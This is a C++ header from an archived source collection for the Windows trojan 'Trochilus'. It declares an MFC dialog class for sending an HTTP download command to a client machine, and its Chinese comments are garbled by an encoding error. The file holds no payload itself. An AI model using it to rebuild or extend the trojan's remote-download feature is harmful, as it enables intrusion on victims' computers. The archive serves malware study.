/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once


// CDownDlg �Ի���

class CDownDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CDownDlg)

public:
	CDownDlg(LPCTSTR clientid,LPCTSTR path,CWnd* pParent = NULL);   // ��׼���캯��
	virtual ~CDownDlg();

// �Ի�������
	enum { IDD = IDD_DIALOG_HTTPDOWN };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	CString m_clientid;
	CString m_path;
	afx_msg void OnBnClickedButtonDown();
};
